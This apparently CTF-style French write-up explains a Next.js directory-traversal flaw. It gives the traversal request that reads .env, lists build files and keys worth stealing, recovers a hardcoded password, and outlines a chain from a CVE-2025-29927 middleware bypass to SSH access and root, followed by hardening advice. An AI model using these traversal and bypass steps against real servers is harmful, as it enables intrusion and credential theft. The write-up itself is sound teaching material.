# Next.Js LFI

#### <mark style="color:blue;">Exploitation de la LFI pour lire des fichiers sensibles</mark>

En modifiant le paramètre `example`, ils peuvent lire n'importe quel fichier :

```http
GET /api/download?example=../../../../../../app/.env HTTP/1.1
```

**Fichiers récupérés et leur importance :**

### <mark style="color:red;">Les fichiers Next.js importants</mark>

#### <mark style="color:blue;">1.</mark> <mark style="color:blue;"></mark><mark style="color:blue;">`.env`</mark> <mark style="color:blue;"></mark><mark style="color:blue;">-</mark> <mark style="color:blue;"></mark><mark style="color:blue;">**LE PLUS CRITIQUE**</mark> <mark style="color:blue;"></mark><mark style="color:blue;">🔴</mark>

```
NEXTAUTH_SECRET=82a464f1c3509a81d5c973c31a23c61a
```

**Ce fichier contient :**

* Les variables d'environnement
* Les secrets de l'application
* Les clés API
* **Les mots de passe en clair parfois !**

**Pourquoi c'est dangereux ?** Ce fichier ne devrait JAMAIS être accessible publiquement.

***

#### <mark style="color:blue;">2.</mark> <mark style="color:blue;"></mark><mark style="color:blue;">`.next/build-manifest.json`</mark>

```json
{
  "pages": {
    "/": [...],
    "/_app": [...],
    "/docs": [...],
    "/signin": [...]
  }
}
```

**Ce fichier révèle :**

* Toutes les pages de l'application
* Les chunks JavaScript utilisés
* La structure du site

**Utilité pour l'attaquant :** Cartographier toute l'application et trouver des endpoints cachés.

***

#### <mark style="color:blue;">3.</mark> <mark style="color:blue;"></mark><mark style="color:blue;">`.next/required-server-files.json`</mark>

Ce fichier contient **toute la configuration de Next.js** :

```json
{
  "config": {
    "experimental": {...},
    "env": {...},
    "output": "standalone",
    "outputFileTracingRoot": "/app"
  },
  "appDir": "/app",
  "files": [...]
}
```

**Informations révélées :**

* Le chemin absolu de l'application (`/app`)
* Les variables d'environnement de build
* Les clés de chiffrement internes
* La configuration complète

**Clés sensibles trouvées :**

```json
"env": {
  "__NEXT_PREVIEW_MODE_ENCRYPTION_KEY": "e08c73fd3f204203133f2f4282440af9...",
  "__NEXT_PREVIEW_MODE_SIGNING_KEY": "5f5ca593a20b8504439b5e22760cf8d8...",
  "NEXT_SERVER_ACTIONS_ENCRYPTION_KEY": "lmAAapzJU+nklkAThiclUFPJCS5Q1pNXK9..."
}
```

***

#### <mark style="color:blue;">4.</mark> <mark style="color:blue;"></mark><mark style="color:blue;">`.next/server/middleware-manifest.json`</mark>

```json
{
  "middleware": {
    "/": {
      "matchers": [
        {
          "regexp": "^(?:\\/(_next\\/data\\/[^/]{1,}))?\\/docs(.*)(\\.json)?",
          "originalSource": "/docs(.*)"
        }
      ]
    }
  }
}
```

**Ce fichier révèle :**

* Quels chemins sont protégés par le middleware
* Les regex utilisées pour matcher les routes
* La structure du middleware

**Utilité :** Comprendre exactement quelles pages sont "censées" être protégées.

***

#### <mark style="color:blue;">5.</mark> <mark style="color:blue;"></mark><mark style="color:blue;">`.next/server/pages-manifest.json`</mark>

```json
{
  "/_app": "pages/_app.js",
  "/api/auth/[...nextauth]": "pages/api/auth/[...nextauth].js",
  "/api/download": "pages/api/download.js",
  "/docs": "pages/docs.html"
}
```

**Ce fichier liste :**

* Tous les fichiers de pages
* Les API endpoints
* Les chemins des fichiers compilés

**Utilité :** Découvrir tous les endpoints de l'API, même ceux non documentés.

***

#### <mark style="color:blue;">6. Le fichier source de l'API d'authentification 🎯</mark>

Le plus important ! Ils ont récupéré le code source compilé de `/api/auth/[...nextauth].js` :

```javascript
authorize: async (e) =>
  e?.username === "jeremy" &&
  e.password === (process.env.ADMIN_SECRET ?? "MyNameIsJeremyAndILovePancakes")
    ? { id: "1", name: "Jeremy" }
    : null,
```

**BINGO ! Ils ont trouvé :**

* **Username :** `jeremy`
* **Mot de passe par défaut :** `MyNameIsJeremyAndILovePancakes`

**Explication du code :**

```javascript
// Si username est "jeremy"
e?.username === "jeremy" &&

// ET que le password est soit la variable d'environnement, 
// soit le mot de passe par défaut
e.password === (process.env.ADMIN_SECRET ?? "MyNameIsJeremyAndILovePancakes")

// Alors on autorise la connexion
? { id: "1", name: "Jeremy" }
: null
```

L'opérateur `??` signifie : "utilise `process.env.ADMIN_SECRET` si elle existe, sinon utilise `MyNameIsJeremyAndILovePancakes`"

***

### <mark style="color:red;">Chronologie complète de l'attaque</mark>

#### <mark style="color:blue;">Phase 1 : Reconnaissance</mark>

```
1. Scan nmap → Détecte port 80 (Next.js)
2. Nuclei → Confirme Next.js vulnérable
3. Gobuster → Découvre /docs, /api, /signin
```

#### <mark style="color:blue;">Phase 2 : Exploitation CVE-2025-29927</mark>

```
4. Envoie l'en-tête x-middleware-subrequest
5. Bypass du middleware d'authentification
6. Accès à /docs sans se connecter
```

#### <mark style="color:blue;">Phase 3 : Découverte de la LFI</mark>

```
7. Trouve /api/download?example=hello-world.ts
8. Teste la traversée de répertoire
9. Confirme qu'on peut lire n'importe quel fichier
```

#### <mark style="color:blue;">Phase 4 : Exfiltration de fichiers sensibles</mark>

```
10. Lit .env → Récupère NEXTAUTH_SECRET
11. Lit build-manifest.json → Cartographie l'app
12. Lit required-server-files.json → Trouve les chemins
13. Lit pages-manifest.json → Découvre tous les endpoints
14. Lit middleware-manifest.json → Comprend les protections
```

#### <mark style="color:blue;">Phase 5 : Récupération des credentials</mark>

```
15. Lit le code source de l'API auth
16. Trouve le username "jeremy"
17. Trouve le password "MyNameIsJeremyAndILovePancakes"
```

#### <mark style="color:blue;">Phase 6 : Connexion SSH</mark>

```
18. Se connecte en SSH avec jeremy:MyNameIsJeremyAndILovePancakes
19. Accès utilisateur obtenu ✅
```

#### <mark style="color:blue;">Phase 7 : Escalade de privilèges</mark>

```
20. sudo -l → Découvre qu'il peut lancer terraform
21. Exploite terraform pour obtenir root
22. Root shell obtenu ✅
```

***

### <mark style="color:red;">Structure des fichiers Next.js</mark>

```
projet-nextjs/
│
├── .env                          ← SECRETS (passwords, API keys)
├── .next/                        ← Dossier de build (DANGEREUX si exposé)
│   ├── build-manifest.json       ← Liste des pages
│   ├── required-server-files.json ← Config complète
│   ├── BUILD_ID                  ← Version du build
│   └── server/
│       ├── pages-manifest.json   ← Mapping des pages
│       ├── middleware-manifest.json ← Config middleware
│       └── pages/
│           └── api/
│               └── auth/
│                   └── [...nextauth].js ← CODE SOURCE !
│
├── pages/                        ← Code source des pages
│   ├── api/
│   │   ├── auth/[...nextauth].ts ← Auth logic
│   │   └── download.ts           ← API endpoint (vulnérable ici)
│   ├── docs.tsx
│   └── index.tsx
│
├── middleware.ts                 ← Middleware d'auth (bypassé)
├── next.config.js                ← Configuration Next.js
└── package.json                  ← Dépendances
```

***

#### <mark style="color:red;">✅ Comment sécuriser</mark>

1.  **Plusieurs couches de sécurité**

    ```javascript
    // Dans le middleware
    export function middleware(req) {
      if (!isAuth(req)) return redirect('/login')
      return next()
    }

    // ET aussi dans la page
    export async function getServerSideProps(ctx) {
      if (!isAuth(ctx.req)) {
        return { redirect: { destination: '/login' } }
      }
      return { props: {} }
    }
    ```
2.  **Bloquer l'accès au dossier `.next/`**

    ```nginx
    # Dans nginx
    location ~ /\.next {
      deny all;
      return 404;
    }
    ```
3.  **Jamais de secrets en dur**

    ```javascript
    // ❌ MAUVAIS
    password === "MyNameIsJeremyAndILovePancakes"

    // ✅ BON
    password === process.env.ADMIN_SECRET
    // Et ADMIN_SECRET doit être défini dans .env
    ```
4.  **Valider tous les inputs**

    ```javascript
    // Dans /api/download
    const example = req.query.example

    // Bloquer les traversées de répertoire
    if (example.includes('..') || example.includes('/')) {
      return res.status(400).json({ error: 'Invalid filename' })
    }
    ```

***
